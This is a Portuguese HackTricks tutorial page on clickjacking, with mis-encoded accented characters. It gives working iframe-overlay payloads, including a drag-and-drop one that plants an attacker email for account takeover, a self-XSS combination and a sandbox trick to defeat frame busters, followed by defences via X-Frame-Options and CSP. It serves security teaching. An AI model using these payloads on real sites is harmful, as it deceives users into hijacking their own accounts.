# Clickjacking

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## O que √© Clickjacking

Clickjacking √© um ataque que **engana** um **usu√°rio** para **clicar** em um **elemento** de uma p√°gina web que √© **invis√≠vel** ou disfar√ßado como outro elemento. Isso pode fazer com que os usu√°rios, sem saber, baixem malware, visitem p√°ginas web maliciosas, forne√ßam credenciais ou informa√ß√µes sens√≠veis, transfiram dinheiro ou comprem produtos online. (De [aqui](https://www.imperva.com/learn/application-security/clickjacking/)).

### Truque de pr√©-preenchimento de formul√°rios

√Äs vezes √© poss√≠vel **preencher o valor dos campos de um formul√°rio usando par√¢metros GET ao carregar uma p√°gina**. Um atacante pode abusar desse comportamento para preencher um formul√°rio com dados arbitr√°rios e enviar a carga de clickjacking para que o usu√°rio pressione o bot√£o Enviar.

### Preencher formul√°rio com Arrastar e Soltar

Se voc√™ precisa que o usu√°rio **preencha um formul√°rio** mas n√£o quer pedir diretamente para ele escrever algumas informa√ß√µes espec√≠ficas (como o email ou uma senha espec√≠fica que voc√™ conhece), voc√™ pode simplesmente pedir para ele **Arrastar e Soltar** algo que escrever√° seus dados controlados como neste [**exemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload B√°sico
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload Multistep
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Payload de Arrastar e Soltar + Clique
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se voc√™ identificou um **ataque XSS que requer que um usu√°rio clique** em algum elemento para **acionar** o XSS e a p√°gina √© **vulner√°vel a clickjacking**, voc√™ pode abusar disso para enganar o usu√°rio a clicar no bot√£o/link.\
Exemplo:\
_Voc√™ encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **apenas voc√™ pode definir e ler**). A p√°gina com o **formul√°rio** para definir esses detalhes √© **vulner√°vel** ao **Clickjacking** e voc√™ pode **preencher previamente** o **formul√°rio** com os par√¢metros GET._\
\_\_Um atacante poderia preparar um ataque de **Clickjacking** para essa p√°gina **preenchendo previamente** o **formul√°rio** com o **payload XSS** e **enganando** o **usu√°rio** a **Enviar** o formul√°rio. Assim, **quando o formul√°rio for enviado** e os valores forem modificados, o **usu√°rio executar√° o XSS**.

## Como evitar Clickjacking

### Defesas do lado do cliente

√â poss√≠vel executar scripts do lado do cliente que realizam alguns ou todos os seguintes comportamentos para prevenir Clickjacking:

* verificar e garantir que a janela da aplica√ß√£o atual seja a principal ou a janela superior,
* tornar todos os frames vis√≠veis,
* prevenir cliques em frames invis√≠veis,
* interceptar e sinalizar poss√≠veis ataques de clickjacking em um usu√°rio.

#### Bypass

Como os frame busters s√£o JavaScript, as configura√ß√µes de seguran√ßa do navegador podem impedir sua opera√ß√£o ou mesmo o navegador pode n√£o suportar JavaScript. Uma solu√ß√£o eficaz de ataque contra frame busters √© usar o atributo `sandbox` do **HTML5 iframe**. Quando isso √© definido com os valores `allow-forms` ou `allow-scripts` e o valor `allow-top-navigation` √© omitido, ent√£o o script de frame buster pode ser neutralizado, pois o iframe n√£o pode verificar se √© ou n√£o a janela superior:
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
```markdown
Os valores `allow-forms` e `allow-scripts` permitem as a√ß√µes especificadas dentro do iframe, mas a navega√ß√£o de n√≠vel superior √© desativada. Isso inibe comportamentos de quebra de frame enquanto permite funcionalidade dentro do site alvo.

Dependendo do tipo de ataque de Clickjacking realizado **voc√™ tamb√©m pode precisar permitir**: `allow-same-origin` e `allow-modals` ou [at√© mais](https://www.w3schools.com/tags/att_iframe_sandbox.asp). Ao preparar o ataque, basta verificar o console do navegador, ele pode informar quais outros comportamentos voc√™ precisa permitir.

### X-Frame-Options

O **cabe√ßalho de resposta HTTP `X-Frame-Options`** pode ser usado para indicar se um navegador deve ou n√£o ser **permitido** para renderizar uma p√°gina em um `<frame>` ou `<iframe>`. Sites podem usar isso para evitar ataques de Clickjacking, garantindo que **seu conte√∫do n√£o seja incorporado em outros sites**. Defina o cabe√ßalho **`X-Frame-Options`** para todas as respostas que contenham conte√∫do HTML. Os valores poss√≠veis s√£o:

* `X-Frame-Options: deny` que **impede qualquer dom√≠nio de enquadrar o conte√∫do** _(Valor recomendado)_
* `X-Frame-Options: sameorigin` que **permite apenas ao site atual** enquadrar o conte√∫do.
* `X-Frame-Options: allow-from https://trusted.com` que **permite ao 'uri' especificado** enquadrar esta p√°gina.
* Verifique as limita√ß√µes abaixo porque **isso falhar√° aberto se o navegador n√£o suportar**.
* Outros navegadores suportam a nova **diretiva CSP frame-ancestors**. Alguns suportam ambos.

### Diretiva frame-ancestors da Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

A **prote√ß√£o recomendada contra clickjacking** √© incorporar a **diretiva `frame-ancestors`** na Pol√≠tica de Seguran√ßa de Conte√∫do da aplica√ß√£o.\
A diretiva **`frame-ancestors 'none'`** √© semelhante em comportamento √† diretiva **X-Frame-Options `deny`** (_Ningu√©m pode enquadrar a p√°gina_).\
A diretiva **`frame-ancestors 'self'`** √© amplamente equivalente √† diretiva **X-Frame-Options `sameorigin`** (_apenas o site atual pode enquadr√°-la_).\
A diretiva **`frame-ancestors trusted.com`** √© amplamente equivalente √† **X-Frame-Options** `allow-from` (_apenas o site confi√°vel pode enquadr√°-la_).

A seguinte CSP lista branca frames para o mesmo dom√≠nio apenas:

`Content-Security-Policy: frame-ancestors 'self';`

Veja a seguinte documenta√ß√£o para mais detalhes e exemplos mais complexos:

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### Limita√ß√µes <a href="#limitations" id="limitations"></a>

* **Suporte do navegador:** CSP frame-ancestors n√£o s√£o suportados por todos os principais navegadores ainda.
* **X-Frame-Options tem prioridade:** [Se√ß√£o "Rela√ß√£o com X-Frame-Options" da Especifica√ß√£o CSP](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options) diz: "_Se um recurso √© entregue com uma pol√≠tica que inclui uma diretiva chamada frame-ancestors e cuja disposi√ß√£o √© "enforce", ent√£o o cabe√ßalho X-Frame-Options DEVE ser ignorado_", mas o Chrome 40 & Firefox 35 ignoram a diretiva frame-ancestors e seguem o cabe√ßalho X-Frame-Options em vez disso.

## Refer√™ncias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
